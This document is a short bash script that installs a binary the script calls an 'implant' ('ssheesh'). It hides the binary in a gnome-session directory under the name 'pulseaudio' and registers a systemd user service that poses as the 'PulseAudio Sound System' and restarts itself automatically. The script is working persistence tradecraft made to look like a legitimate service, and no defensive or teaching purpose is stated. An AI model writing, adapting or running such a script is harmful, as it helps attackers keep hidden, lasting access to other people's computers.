#!/bin/bash

# === CONFIG ===
TARGET_DIR="$HOME/.local/share/gnome-session"
TARGET_BIN="$TARGET_DIR/pulseaudio"
SERVICE_DIR="$HOME/.config/systemd/user"
SERVICE_FILE="$SERVICE_DIR/ssheesh.service"

# === PREP ===
mkdir -p "$TARGET_DIR"
mkdir -p "$SERVICE_DIR"

# === COPY IMPLANT ===
cp ssheesh "$TARGET_BIN"
chmod +x "$TARGET_BIN"

# === CREATE SERVICE ===
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=PulseAudio Sound System
After=default.target

[Service]
ExecStart=$TARGET_BIN
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

# === ENABLE + START ===
systemctl --user daemon-reexec
systemctl --user enable ssheesh
systemctl --user start ssheesh
